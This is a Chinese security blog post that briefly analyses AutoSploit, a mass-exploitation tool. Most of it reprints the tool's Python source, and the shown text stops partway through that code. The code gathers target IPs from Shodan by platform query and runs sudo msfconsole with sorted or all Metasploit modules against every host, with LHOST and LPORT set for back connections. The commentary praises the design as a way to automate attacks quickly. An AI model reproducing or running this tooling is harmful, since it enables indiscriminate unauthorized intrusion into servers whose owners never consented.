@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                AutoSploit的简单分析 |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">AutoSploit的简单分析</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2018-01-20 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">安全开发</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>16 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p><a class="link" target="_blank" rel="noopener" href="https://github.com/NullArray/AutoSploit">https://github.com/NullArray/AutoSploit<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单看了下这个工具的源码，核心的关键代码分为两部分</p>
+<ul>
+<li>第一部分：通过shadon获取目标IP</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api = shodan.Shodan(SHODAN_API_KEY)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = api.search(query)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if clobber == True:</span><br><span class="line">    with open(&#x27;hosts.txt&#x27;, &#x27;wb&#x27;) as log:</span><br><span class="line">        for i in xrange(toolbar_width):</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            for service in result[&#x27;matches&#x27;]:</span><br><span class="line">                log.write(service[&#x27;ip_str&#x27;])</span><br><span class="line">                log.write(&quot;\n&quot;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二部分：通过MSF攻击目标IP</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if choice == &#x27;s&#x27;:</span><br><span class="line">    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">        for rhosts in host_list:</span><br><span class="line">            for exploit in sorted_modules:</span><br><span class="line">                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                os.system(template)</span><br><span class="line">elif choice == &#x27;a&#x27;:</span><br><span class="line">    with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">        for rhosts in host_list:</span><br><span class="line">            for exploit in all_modules:</span><br><span class="line">                template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                os.system(template)</span><br><span class="line">else:</span><br><span class="line">    print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这个工具这样看起来并不复杂，但更重要的是学习作者的思路，<code>利用简单的代码快速将常见的独立的工具结合起来，各取所长，实现快速自动化操作</code></p>
+<p>全部代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2.7</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">from subprocess import PIPE, Popen</span><br><span class="line"></span><br><span class="line">import shodan</span><br><span class="line">from blessings import Terminal</span><br><span class="line"></span><br><span class="line">t = Terminal()</span><br><span class="line"></span><br><span class="line"># Global vars</span><br><span class="line">api = &quot;&quot;</span><br><span class="line">query = &quot;&quot;</span><br><span class="line">workspace = &quot;&quot;</span><br><span class="line">local_port = &quot;&quot;</span><br><span class="line">local_host = &quot;&quot;</span><br><span class="line">configured = False</span><br><span class="line">toolbar_width = 60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Logo</span><br><span class="line">def logo():</span><br><span class="line">    print t.cyan(&quot;&quot;&quot;</span><br><span class="line">                              _____     _       _____     _     _ _   </span><br><span class="line">#--Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_ </span><br><span class="line">#--Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|</span><br><span class="line">#--Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|  </span><br><span class="line">#--Version: 1.0.0                                    |_|             </span><br><span class="line">##############################################</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Usage and legal.</span><br><span class="line">def usage():</span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line">    print &quot;&quot;&quot;</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">|            AutoSploit General Usage and Information                   |</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">|As the name suggests AutoSploit attempts to automate the exploitation  |</span><br><span class="line">|of remote hosts. Targets are collected by employing the Shodan.io API. |</span><br><span class="line">|                                                                       |</span><br><span class="line">|The &#x27;Gather Hosts&#x27; option will open a dialog from which you can        |</span><br><span class="line">|enter platform specific search queries such as &#x27;Apache&#x27; or &#x27;IIS&#x27;.      |</span><br><span class="line">|Upon doing so a list of candidates will be retrieved and saved to      |</span><br><span class="line">|hosts.txt in the current working directory.                            |</span><br><span class="line">|After this operation has been completed the &#x27;Exploit&#x27; option will      |</span><br><span class="line">|go about the business of attempting to exploit these targets by        |</span><br><span class="line">|running a range of Metasploit modules against them.                    |</span><br><span class="line">|                                                                       |</span><br><span class="line">|Workspace, local host and local port for MSF facilitated               |</span><br><span class="line">|back connections are configured through the dialog that comes up       |</span><br><span class="line">|before the &#x27;Exploit&#x27; module is started.                                |</span><br><span class="line">|                                                                       |</span><br><span class="line">+------------------+----------------------------------------------------+</span><br><span class="line">|     Option       |                   Summary                          |</span><br><span class="line">+------------------+----------------------------------------------------+</span><br><span class="line">|1. Usage          | Display this informational message.                |</span><br><span class="line">|2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  |</span><br><span class="line">|3. View Hosts     | Print gathered IPs/RHOSTS.                         |</span><br><span class="line">|4. Exploit        | Configure MSF and Start exploiting gathered targets|</span><br><span class="line">|5. Quit           | Exits AutoSploit.                                  |</span><br><span class="line">+------------------+----------------------------------------------------+</span><br><span class="line">|                         Legal Disclaimer                              |</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">| Usage of AutoSploit for attacking targets without prior mutual consent| </span><br><span class="line">| is illegal. It is the end user&#x27;s responsibility to obey all applicable| </span><br><span class="line">| local, state and federal laws. Developers assume no liability and are |</span><br><span class="line">| not responsible for any misuse or damage caused by this program!	|</span><br><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Function that allows us to store system command</span><br><span class="line"># output in a variable</span><br><span class="line">def cmdline(command):</span><br><span class="line">    process = Popen(</span><br><span class="line">        args=command,</span><br><span class="line">        stdout=PIPE,</span><br><span class="line">        shell=True</span><br><span class="line">    )</span><br><span class="line">    return process.communicate()[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit(query):</span><br><span class="line">    global workspace</span><br><span class="line">    global local_port</span><br><span class="line">    global local_host</span><br><span class="line"></span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    sorted_modules = []</span><br><span class="line">    all_modules = []</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Sorting modules relevant to the specified platform.&quot;</span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]This may take a while...\n\n\n&quot;</span><br><span class="line"></span><br><span class="line">    # Progress bar</span><br><span class="line">    sys.stdout.write(&quot;[%s]&quot; % (&quot; &quot; * toolbar_width))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    sys.stdout.write(&quot;\b&quot; * (toolbar_width + 1))</span><br><span class="line"></span><br><span class="line">    with open(&quot;modules.txt&quot;, &quot;rb&quot;) as infile:</span><br><span class="line">        for i in xrange(toolbar_width):</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            for lines in infile:</span><br><span class="line">                all_modules.append(lines)</span><br><span class="line">                if query in lines:</span><br><span class="line">                    sorted_modules.append(lines)</span><br><span class="line"></span><br><span class="line">            # update the bar</span><br><span class="line">            sys.stdout.write(&#x27;\033[94m&#x27; + &quot;|&quot; + &#x27;\033[0m&#x27;)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    print &quot;\n\n\n[&quot; + t.green(&quot;+&quot;) + &quot;]AutoSploit sorted the following MSF modules based search query relevance.\n&quot;</span><br><span class="line">    # Print out the sorted modules</span><br><span class="line">    for line in sorted_modules:</span><br><span class="line">        print &quot;[&quot; + t.cyan(&quot;-&quot;) + &quot;]&quot; + line</span><br><span class="line"></span><br><span class="line">    # We&#x27;ll give the user the option to run all modules in a &#x27;hail mary&#x27; type of attack or allow</span><br><span class="line">    # a more directed approach with the sorted modules.</span><br><span class="line">    choice = raw_input(&quot;\n[&quot; + t.magenta(&quot;?&quot;) + &quot;]Run sorted or all modules against targets? [S]orted/[A]ll: &quot;).lower()</span><br><span class="line"></span><br><span class="line">    if choice == &#x27;s&#x27;:</span><br><span class="line">        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">            for rhosts in host_list:</span><br><span class="line">                for exploit in sorted_modules:</span><br><span class="line">                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                    workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                    os.system(template)</span><br><span class="line">    elif choice == &#x27;a&#x27;:</span><br><span class="line">        with open(&quot;hosts.txt&quot;, &quot;rb&quot;) as host_list:</span><br><span class="line">            for rhosts in host_list:</span><br><span class="line">                for exploit in all_modules:</span><br><span class="line">                    template = &quot;sudo msfconsole -x &#x27;workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s&#x27;&quot; % (</span><br><span class="line">                    workspace, local_host, local_port, rhosts, exploit)</span><br><span class="line">                    os.system(template)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Unhandled Option. Defaulting to Main Menu&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Function to gather target hosts from Shodan </span><br><span class="line">def targets(clobber=True):</span><br><span class="line">    global query</span><br><span class="line"></span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please provide your platform specific search query.&quot;</span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]I.E. &#x27;IIS&#x27; will return a list of IPs belonging to IIS servers.&quot;</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        query = raw_input(&quot;\n&lt;&quot; + t.cyan(&quot;PLATFORM&quot;) + &quot;&gt;$ &quot;)</span><br><span class="line"></span><br><span class="line">        if query == &quot;&quot;:</span><br><span class="line">            print &quot;[&quot; + t.red(&quot;!&quot;) + &quot;]Query cannot be null.&quot;</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Please stand by while results are being collected...\n\n\n&quot;</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        result = api.search(query)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;\n[&quot; + t.red(&quot;!&quot;) + &quot;]Critical. An error was raised with the following error message.\n&quot;</span><br><span class="line">        print e</span><br><span class="line"></span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    # Setup progress bar</span><br><span class="line">    sys.stdout.write(&quot;[%s]&quot; % (&quot; &quot; * toolbar_width))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    sys.stdout.write(&quot;\b&quot; * (toolbar_width + 1))</span><br><span class="line"></span><br><span class="line">    if clobber == True:</span><br><span class="line">        with open(&#x27;hosts.txt&#x27;, &#x27;wb&#x27;) as log:</span><br><span class="line">            for i in xrange(toolbar_width):</span><br><span class="line">                time.sleep(0.1)</span><br><span class="line">                for service in result[&#x27;matches&#x27;]:</span><br><span class="line">                    log.write(service[&#x27;ip_str&#x27;])</span><br><span class="line">                    log.write(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">                # update the bar</span><br><span class="line">                sys.stdout.write(&#x27;\033[94m&#x27; + &quot;|&quot; + &#x27;\033[0m&#x27;)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">        hostpath = os.path.abspath(&quot;hosts.txt&quot;)</span><br><span class="line"></span><br><span class="line">        print &quot;\n\n\n[&quot; + t.green(&quot;+&quot;) + &quot;]Done.&quot;</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Host list saved to &quot; + hostpath</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        with open(&quot;hosts.txt&quot;, &quot;ab&quot;) as log:</span><br><span class="line">            for i in xrange(toolbar_width):</span><br><span class="line">                time.sleep(0.1)</span><br><span class="line">                for service in result[&#x27;matches&#x27;]:</span><br><span class="line">                    log.write(service[&#x27;ip_str&#x27;])</span><br><span class="line">                    log.write(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">        # update the bar</span><br><span class="line">        sys.stdout.write(&#x27;\033[94m&#x27; + &quot;|&quot; + &#x27;\033[0m&#x27;)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">        hostpath = os.path.abspath(&quot;hosts.txt&quot;)</span><br><span class="line"></span><br><span class="line">        print &quot;\n\n\n[&quot; + t.green(&quot;+&quot;) + &quot;]Done.&quot;</span><br><span class="line">        print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]Hosts appended to list at &quot; + hostpath</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Function to define metasploit settings</span><br><span class="line">def settings():</span><br><span class="line">    global workspace</span><br><span class="line">    global local_port</span><br><span class="line">    global local_host</span><br><span class="line">    global configured</span><br><span class="line"></span><br><span class="line">    os.system(&quot;clear&quot;)</span><br><span class="line">    logo()</span><br><span class="line"></span><br><span class="line">    print &quot;[&quot; + t.green(&quot;+&quot;) + &quot;]MSF Settings\n&quot;</span><br><span class="line">    print &quot;In order to proceed with the exploit module some MSF&quot;</span><br><span 